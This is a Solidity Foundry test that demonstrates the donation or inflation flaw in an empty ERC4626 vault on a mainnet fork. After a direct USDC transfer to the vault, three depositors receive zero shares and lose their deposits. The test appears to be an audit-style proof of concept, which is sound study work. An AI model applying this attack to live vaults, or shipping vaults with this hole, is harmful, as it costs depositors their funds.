// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

contract Erc4626Impl is ERC4626 {
    constructor(IERC20 asset_) ERC4626(asset_) ERC20("Test Vault", "vTEST") {}
}

contract PlasmaVaultBasicTest is Test {
    address public constant victim1 = address(0x1);
    address public constant victim2 = address(0x2);
    address public constant victimN = address(0x3);
    address public erc4626Impl;
    uint256 public shares;
    uint256 public assets;
    uint256 public victimAmount = 1000e6;

    uint256 public victim1WalletBalanceBeforeDeposit;
    uint256 public victim2WalletBalanceBeforeDeposit;
    uint256 public victimNWalletBalanceBeforeDeposit;

    uint256 public victim1WalletBalanceAfterDeposit;
    uint256 public victim2WalletBalanceAfterDeposit;
    uint256 public victimNWalletBalanceAfterDeposit;

    uint256 public victim1SharesAfterDeposit;
    uint256 public victim2SharesAfterDeposit;
    uint256 public victimNSharesAfterDeposit;

    uint256 public totalSupplyBeforeDeposit;
    uint256 public totalAssetsBeforeDeposit;
    uint256 public totalSupplyAfterDeposit;
    uint256 public totalAssetsAfterDeposit;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETHEREUM_PROVIDER_URL"), 21895648);
        erc4626Impl = address(new Erc4626Impl(IERC20(USDC)));

        vm.prank(0x137000352B4ed784e8fa8815d225c713AB2e7Dc9);
        IERC20(USDC).transfer(address(victim1), 10 * victimAmount);

        vm.prank(0x137000352B4ed784e8fa8815d225c713AB2e7Dc9);
        IERC20(USDC).transfer(address(victim2), 10 * victimAmount);

        vm.prank(0x137000352B4ed784e8fa8815d225c713AB2e7Dc9);
        IERC20(USDC).transfer(address(victimN), 10 * victimAmount);

        vm.prank(victim1);
        IERC20(USDC).approve(address(erc4626Impl), 10 * victimAmount);

        vm.prank(victim2);
        IERC20(USDC).approve(address(erc4626Impl), 10 * victimAmount);

        vm.prank(victimN);
        IERC20(USDC).approve(address(erc4626Impl), 10 * victimAmount);
    }

    function testExchangeRateErc4626() public {
        uint256 externalAmount = 1000e6;

        vm.prank(0x137000352B4ed784e8fa8815d225c713AB2e7Dc9);
        IERC20(USDC).transfer(address(erc4626Impl), externalAmount);

        console2.log("Exchange rate before deposits:", ERC4626(erc4626Impl).convertToShares(1e6));

        victim1WalletBalanceBeforeDeposit = IERC20(USDC).balanceOf(victim1);
        victim2WalletBalanceBeforeDeposit = IERC20(USDC).balanceOf(victim2);
        victimNWalletBalanceBeforeDeposit = IERC20(USDC).balanceOf(victimN);

        console2.log("Victim1 wallet balanceOf before deposit:", victim1WalletBalanceBeforeDeposit);
        console2.log("Victim2 wallet balanceOf before deposit:", victim2WalletBalanceBeforeDeposit);
        console2.log("VictimN wallet balanceOf before deposit:", victimNWalletBalanceBeforeDeposit);

        totalSupplyBeforeDeposit = ERC4626(erc4626Impl).totalSupply();
        totalAssetsBeforeDeposit = ERC4626(erc4626Impl).totalAssets();

        vm.prank(victim1);
        victim1SharesAfterDeposit = ERC4626(erc4626Impl).deposit(victimAmount, victim1);
        console2.log("Victim1 vault shares after deposit:", victim1SharesAfterDeposit);
        console2.log(
            "Victim1 vault assets after deposit:",
            ERC4626(erc4626Impl).convertToAssets(ERC4626(erc4626Impl).balanceOf(victim1))
        );

        vm.prank(victim2);
        victim2SharesAfterDeposit = ERC4626(erc4626Impl).deposit(victimAmount, victim2);
        console2.log("Victim2 vault shares after deposit:", victim2SharesAfterDeposit);
        console2.log(
            "Victim2 vault assets after deposit:",
            ERC4626(erc4626Impl).convertToAssets(ERC4626(erc4626Impl).balanceOf(victim2))
        );

        vm.prank(victimN);
        victimNSharesAfterDeposit = ERC4626(erc4626Impl).deposit(victimAmount, victimN);
        console2.log("VictimN vault shares after deposit:", victimNSharesAfterDeposit);
        console2.log(
            "VictimN vault assets after deposit:",
            ERC4626(erc4626Impl).convertToAssets(ERC4626(erc4626Impl).balanceOf(victimN))
        );

        /// @dev EVERY next victims lost theirs funds if they deposit lower than externalAmount

        victim1WalletBalanceAfterDeposit = IERC20(USDC).balanceOf(victim1);
        victim2WalletBalanceAfterDeposit = IERC20(USDC).balanceOf(victim2);
        victimNWalletBalanceAfterDeposit = IERC20(USDC).balanceOf(victimN);

        console2.log("Victim1 wallet balanceOf after deposit:", victim1WalletBalanceAfterDeposit);
        console2.log("Victim2 wallet balanceOf after deposit:", victim2WalletBalanceAfterDeposit);
        console2.log("VictimN wallet balanceOf after deposit:", victimNWalletBalanceAfterDeposit);

        console2.log("Exchange rate after deposits:", ERC4626(erc4626Impl).convertToShares(1e6));

        vm.startPrank(victim1);
        assets = ERC4626(erc4626Impl).redeem(ERC4626(erc4626Impl).balanceOf(victim1), victim1, victim1);
        console2.log("Victim1 assets after redeem:", assets);
        console2.log("Victim1 wallet balanceOf after redeem:", IERC20(USDC).balanceOf(victim1));
        vm.stopPrank();

        vm.startPrank(victim2);
        assets = ERC4626(erc4626Impl).redeem(ERC4626(erc4626Impl).balanceOf(victim2), victim2, victim2);
        console2.log("Victim2 assets after redeem:", assets);
        console2.log("Victim2 wallet balanceOf after redeem:", IERC20(USDC).balanceOf(victim2));
        vm.stopPrank();

        vm.startPrank(victimN);
        assets = ERC4626(erc4626Impl).redeem(ERC4626(erc4626Impl).balanceOf(victimN), victimN, victimN);
        console2.log("VictimN assets after redeem:", assets);
        console2.log("VictimN wallet balanceOf after redeem:", IERC20(USDC).balanceOf(victimN));
        vm.stopPrank();

        totalSupplyAfterDeposit = ERC4626(erc4626Impl).totalSupply();
        totalAssetsAfterDeposit = ERC4626(erc4626Impl).totalAssets();

        console2.log("Vault totalSupply:", totalSupplyAfterDeposit);
        console2.log("Vault totalAssets:", totalAssetsAfterDeposit);

        assertGt(victim1WalletBalanceBeforeDeposit, victim1WalletBalanceAfterDeposit);
        assertGt(victim2WalletBalanceBeforeDeposit, victim2WalletBalanceAfterDeposit);
        assertGt(victimNWalletBalanceBeforeDeposit, victimNWalletBalanceAfterDeposit);

        assertEq(victim1SharesAfterDeposit, 0);
        assertEq(victim2SharesAfterDeposit, 0);
        assertEq(victimNSharesAfterDeposit, 0);

        assertEq(totalSupplyBeforeDeposit, 0);
        assertEq(totalAssetsBeforeDeposit, 1000000000);

        assertEq(totalSupplyAfterDeposit, 0);
        assertEq(totalAssetsAfterDeposit, 4000000000);
    }
}
